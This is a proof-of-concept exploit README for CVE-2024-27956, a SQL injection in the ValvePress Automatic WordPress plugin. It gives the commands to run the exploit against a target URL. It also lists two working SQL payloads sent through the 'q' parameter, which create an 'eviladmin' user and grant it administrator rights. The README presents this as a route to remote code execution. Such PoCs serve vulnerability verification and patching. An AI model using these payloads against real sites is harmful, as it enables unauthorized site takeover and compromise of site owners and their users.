# CVE-2024-27956-RCE
A PoC for CVE-2024-27956, a SQL Injection in ValvePress Automatic plugin. This PoC exploit the vulnerability creating a user in the target and giving Administrator rights. Being an administrator in wordpress can lead to Remote Code Execution.

<h1>Usage</h1>

```
git clone https://github.com/diego-tella/CVE-2024-27956-RCE/
cd CVE-2024-27956-RCE
python exploit.py http://target.com
```

<h1>Payloads</h1>
SQL Injection payload to create a user:

```
q=INSERT INTO wp_users (user_login, user_pass, user_nicename, user_email, user_url, user_registered, user_status, display_name) VALUES ('eviladmin', '$P$BASbMqW0nlZRux/2IhCw7AdvoNI4VT0', 'eviladmin', 'eviladmin@gmail.com', 'http://127.0.0.1:8000', '2024-04-30 16:26:43', 0, 'eviladmin')
```

Giving admin rights:

```
q=INSERT INTO wp_usermeta (user_id, meta_key, meta_value) VALUES ((SELECT ID FROM wp_users WHERE user_login = 'eviladmin'), 'wp_capabilities', 'a:1:{s:13:\"administrator\";s:1:\"1\";}
```

In the q parameter, we can pass our entire query and then it will be executed.

![image](https://github.com/diego-tella/CVE-2024-27956-RCE/assets/70545257/0e24c3ee-52e0-4e7f-9eb1-b54e4096325f)
The user input is executed directly without any kind of restriction or sanitization.

<h1>PoC</h1>
<a href="https://www.youtube.com/watch?v=2y5siI-K-G0"><img src="Screenshot_2.png"></a>
